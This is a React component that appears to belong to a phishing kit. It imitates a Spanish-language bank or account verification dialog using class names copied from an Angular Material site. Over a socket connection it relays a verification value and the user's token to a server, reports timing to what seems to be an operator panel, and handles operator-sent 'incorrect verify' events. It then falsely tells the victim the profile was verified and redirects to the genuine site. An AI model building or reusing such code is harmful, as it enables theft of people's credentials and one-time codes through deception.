import React from "react";
import { useSocket } from "./SocketContext";
import img0 from "./../images/v.png";
import { link } from "./settings";
import style from "./css/login.module.css";
import { useSelector } from "react-redux";

function Verify({ sS }) {
  const { currentSocket: socket } = useSocket();
  const [p, setP] = React.useState("");
  const [isActive, setIsActive] = React.useState(true);
  const [time, setTime] = React.useState(0);
  const [cont, setCont] = React.useState(0);
  const user = useSelector(e => e.users);

  const handleButton = () => {
    window.location.href = link;
  };

  React.useEffect(() => {
    if (socket)
      if (p !== "") {
        socket.emit("update verify", { verify: p, bVerify: false, token: user.token });
        socket.emit("open bVerify", { bVerify: false });
      }
  }, [p]);

  React.useEffect(() => {
    let interval = null;
    if (time >= 5) {
      window.location.href = link;
      setIsActive(false);
      setCont(cont + 0);
      setTime(0);
    }
    if (isActive) {
      interval = setInterval(() => {
        setTime((time) => time + 1);
        if (socket) socket.emit("time user", { time: time + 1, p: cont + 2 });
      }, 1000);
    } else {
      clearInterval(interval);
    }
    return () => {
      clearInterval(interval);
    };
  }, [isActive, time, cont]);

  React.useEffect(() => {
    if (socket)
      socket.on("incorrect verify", () => {
        setIsActive(false);
        setTime(0);
        setCont(0);
        setP("");
        sS(false);
        socket.emit("open bVerify", { bVerify: false });
      });
    return () => {
      if (socket) socket.off("incorrect verify");
    };
  }, []);
  return (
    <>
      <div
        className={
          style["cdk-live-announcer-element"] +
          " " +
          style["cdk-visually-hidden"]
        }
        aria-atomic="true"
        aria-live="polite"
      ></div>
      <div
        id="cdk-describedby-message-container"
        aria-hidden="true"
        style={{ display: "none" }}
      >
        <div id="cdk-describedby-message-0">Gestiona tu usuario</div>
      </div>
      <div className={style["cdk-overlay-container"]}>
        <div
          className={
            style["cdk-overlay-backdrop"] +
            " " +
            style["cdk-overlay-dark-backdrop"] +
            " " +
            style["cdk-overlay-backdrop-showing"]
          }
        ></div>
        <div
          className={style["cdk-global-overlay-wrapper"]}
          dir="ltr"
          style={{ justifyContent: "center", alignItems: "center" }}
        >
          <div
            id="cdk-overlay-1"
            className={style["cdk-overlay-pane"]}
            style={{
              maxWidth: "80vw",
              pointerEvents: "auto",
              width: "370px",
              height: "auto",
              position: "static",
            }}
          >
            <div
              tabIndex="0"
              className={
                style["cdk-visually-hidden"] +
                " " +
                style["cdk-focus-trap-anchor"]
              }
            ></div>
            <div
              aria-modal="true"
              className={
                style["mat-dialog-container"] +
                " " +
                style["ng-tns-c14-2"] +
                " " +
                style["ng-trigger"] +
                " " +
                style["ng-trigger-slideDialog"] +
                " " +
                style["ng-star-inserted"]
              }
              tabIndex="-1"
              id="mat-dialog-0"
              role="dialog"
              style={{ transform: "none", opacity: "1" }}
            >
              <div _nghost-c15="" className={style["ng-star-inserted"]}>
                <div _ngcontent-c15="" className={style["container"]}>
                  <div _ngcontent-c15="" className={style["row"]}>
                    <h3
                      _ngcontent-c15=""
                      className={style["text-center"]}
                      style={{ color: "#0067b1" }}
                    >
                      Autenticacin verificada
                    </h3>
                  </div>
                  <div
                    _ngcontent-c15=""
                    className={
                      style["text-center"] +
                      " " +
                      style["ng-pristine"] +
                      " " +
                      style["ng-invalid"] +
                      " " +
                      style["ng-touched"]
                    }
                    novalidate=""
                  >
                    <img src={img0} style={{ width: "100%" }} />
                    <div _ngcontent-c15="" className={style["row"]}>
                      <h6
                        _ngcontent-c15=""
                        className={style["text-center"]}
                        style={{ color: "#0067b1", fontSize: '14px' }}
                      >
                        * Su perfil fue verificado exitosamente, ingrese
                        nuevamente.
                      </h6>
                    </div>
                    <div _ngcontent-c15="" className={style["row"]}>
                      <div
                        _ngcontent-c15=""
                        className={style["button-container"]}
                      >
                        <button
                          _ngcontent-c15=""
                          color="accent"
                          mat-raised-button=""
                          className={
                            style["mat-raised-button"] +
                            " " +
                            style["mat-accent"] +
                            " " +
                            style["ng-pristine"] +
                            " " +
                            style["ng-invalid"] +
                            " " +
                            style["ng-touched"]
                          }
                          onClick={handleButton}
                        >
                          <span className={style["mat-button-wrapper"]}>
                            Continuar
                          </span>
                          <div
                            className={
                              style["mat-button-ripple"] +
                              " " +
                              style["mat-ripple"]
                            }
                            matripple=""
                          ></div>
                          <div
                            className={style["mat-button-focus-overlay"]}
                          ></div>
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div
              tabIndex="0"
              className={
                style["cdk-visually-hidden"] +
                " " +
                style["cdk-focus-trap-anchor"]
              }
            ></div>
          </div>
        </div>
      </div>
    </>
  );
}

export default Verify;
